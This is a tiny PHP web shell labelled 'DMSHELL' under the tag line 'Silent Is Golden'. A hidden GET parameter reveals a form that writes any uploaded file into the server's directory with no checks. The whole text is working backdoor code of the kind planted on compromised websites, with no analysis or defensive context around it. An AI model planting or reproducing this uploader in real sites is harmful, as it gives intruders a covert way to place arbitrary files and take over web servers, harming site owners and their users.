../Silent Is Golden ../DMSHELL
<?php 
if(isset($_GET["dm"])){
echo"<pre><form method='post' enctype='multipart/form-data'><input type='file' name='x'><input name='de' type='submit'value='em'>";
if($_POST['de']=='em'){
if(@copy($_FILES["x"]["tmp_name"],$_FILES["x"]["name"])){
echo"true";
} else {
echo"false";
}
} 
}
?>
